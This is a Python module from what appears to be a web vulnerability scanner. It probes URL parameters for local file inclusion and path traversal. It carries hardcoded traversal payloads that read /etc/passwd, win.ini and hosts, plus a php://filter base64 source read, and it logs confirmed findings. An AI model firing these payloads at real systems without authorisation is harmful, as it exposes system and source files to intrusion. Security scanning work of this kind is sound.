from __future__ import annotations

import asyncio
import urllib.parse

from .common import Finding, ScanContext, VulnerabilityModule, run_bounded, url_with_params
from .adaptive_guard import AdaptiveResponseGuard
from .payload_utils import lfi_payloads


class LfiModule(VulnerabilityModule):
    name = "lfi"
    ZERO_TOUCH_PAYLOADS_PER_INPUT = 48
    FALLBACK_PAYLOADS_PER_INPUT = 12

    PARAMS = [
        "file",
        "path",
        "page",
        "include",
        "template",
        "view",
        "doc",
        "document",
        "load",
        "read",
        "src",
        "resource",
    ]

    PAYLOADS = [
        ("../../../etc/passwd", "root:x:"),
        ("../../../../etc/passwd", "root:x:"),
        ("..%2F..%2F..%2Fetc%2Fpasswd", "root:x:"),
        ("....//....//....//etc/passwd", "root:x:"),
        ("../../../windows/win.ini", "[extensions]"),
        ("../../../../windows/system32/drivers/etc/hosts", "localhost"),
        ("php://filter/convert.base64-encode/resource=index.php", "PD9waHA"),
    ]

    async def run(self, ctx: ScanContext) -> list[Finding]:
        candidates = self._candidate_urls(ctx)
        deep = str(ctx.policy.profile or "").lower() == "deep"
        fallback = not candidates
        if fallback:
            # Sin parametros observados no tiene sentido multiplicar 10k payloads
            # contra nombres inventados. Se conserva una muestra de alta senal.
            candidates = [(ctx.target.url, self.PARAMS[:8])]
        per_input = (
            ctx.limits.max_tests_per_module
            if deep
            else (self.FALLBACK_PAYLOADS_PER_INPUT if fallback else self.ZERO_TOUCH_PAYLOADS_PER_INPUT)
        )
        payloads = lfi_payloads(
            ctx.wordlists,
            self.PAYLOADS,
            limit=max(len(self.PAYLOADS), min(ctx.limits.max_tests_per_module, per_input)),
        )
        findings: list[Finding] = []
        tested = 0
        lock = asyncio.Lock()
        guard = AdaptiveResponseGuard(
            block_threshold=ctx.limits.adaptive_waf_block_threshold,
            plateau_threshold=ctx.limits.adaptive_plateau_threshold,
        )

        probe_specs: list[tuple[str, str, str, str]] = []
        inputs = [
            (url, param)
            for url, params in candidates
            for param in params[:10]
            if any(token in param.lower() for token in self.PARAMS)
        ]
        # Reparto round-robin: un parametro nunca consume por si solo todo el
        # presupuesto y cada superficie recibe primero los payloads mas utiles.
        for payload, marker in payloads:
            for url, param in inputs:
                if len(probe_specs) >= ctx.limits.max_tests_per_module:
                    break
                probe_specs.append((url, param, payload, marker))
            if len(probe_specs) >= ctx.limits.max_tests_per_module:
                break

        baselines: dict[tuple[str, str], object | None] = {}
        for url, param in dict.fromkeys((url, param) for url, param, _payload, _marker in probe_specs):
            baselines[(url, param)] = await ctx.http.request(
                "GET", url, params={param: "scan_titan_control"}
            )

        async def probe(
            url: str,
            param: str,
            payload: str,
            marker: str,
            baseline: object | None,
        ) -> None:
            nonlocal tested
            input_key = f"{url}|{param}"
            if guard.stop_module or guard.input_stopped(input_key):
                return
            result = await ctx.http.request("GET", url, params={param: payload})
            positive = bool(
                result
                and baseline
                and int(result.status or 0) < 400
                and marker in result.text
                and marker not in baseline.text
            )
            decision = guard.observe(
                result,
                input_key=input_key,
                probe_value=payload,
                baseline=baseline,
                positive_signal=positive,
            )
            async with lock:
                tested += 1
                if decision.stop_module or decision.stop_input:
                    ctx.heartbeat(self.name, decision.reason, tested, len(findings))
                elif tested == 1 or tested % 20 == 0 or tested == len(probe_specs):
                    ctx.heartbeat(self.name, f"{param}={payload[:28]}", tested, len(findings))
            if not result or not baseline or int(result.status or 0) >= 400:
                return
            if not positive:
                return
            findings.append(
                Finding(
                    target=ctx.target.display,
                    category="LFI",
                    severity="Critical",
                    title=f"LFI / Path Traversal: {param}",
                    url=url_with_params(url, {param: payload}),
                    endpoint=urllib.parse.urlparse(url).path or "/",
                    param=param,
                    method="GET",
                    payload=payload,
                    status=str(result.status),
                    size=f"{result.body_len}b",
                    elapsed=f"{result.elapsed:.2f}s",
                    evidence=f"Differential system file marker observed only after traversal payload: {marker}",
                    source=self.name,
                    confidence="high",
                    evidence_strength="strong",
                    false_positive_risk="low",
                )
            )

        async def run_probe(spec: tuple[str, str, str, str]) -> None:
            url, param, payload, marker = spec
            await probe(url, param, payload, marker, baselines.get((url, param)))

        await run_bounded(
            probe_specs,
            run_probe,
            limit=8,
            should_stop=lambda: ctx.should_stop() or guard.stop_module,
        )
        guard_summary = guard.summary()
        if guard_summary["waf_vendor"]:
            ctx.recon["waf_cdn"] = sorted(
                set(ctx.recon.get("waf_cdn", []) + [guard_summary["waf_vendor"]])
            )
        if guard_summary["module_stopped"] or guard_summary["stopped_inputs"]:
            ctx.recon.setdefault("adaptive_stops", []).append({"module": self.name, **guard_summary})
        ctx.recon["lfi_active_summary"] = {
            "mode": "fallback-high-signal" if fallback else "observed-parameters",
            "inputs": len(inputs),
            "planned": len(probe_specs),
            "tested": tested,
            "findings": len(findings),
            "adaptive_guard": guard_summary,
        }
        return findings

    def _candidate_urls(self, ctx: ScanContext) -> list[tuple[str, list[str]]]:
        candidates: list[tuple[str, list[str]]] = []
        target_params = [name for name, _value in urllib.parse.parse_qsl(urllib.parse.urlparse(ctx.target.url).query)]
        if target_params:
            candidates.append((ctx.target.url, target_params))
        for endpoint in ctx.recon.get("endpoints", [])[:40]:
            url = endpoint.get("url")
            params = endpoint.get("params") or []
            if url and params:
                candidates.append((url, [str(param) for param in params if str(param).strip()]))
        seen: set[tuple[str, tuple[str, ...]]] = set()
        unique: list[tuple[str, list[str]]] = []
        for url, params in candidates:
            relevant = [param for param in params if any(token in param.lower() for token in self.PARAMS)]
            key = (url, tuple(sorted(set(relevant))))
            if relevant and key not in seen:
                seen.add(key)
                unique.append((url, relevant))
        return unique
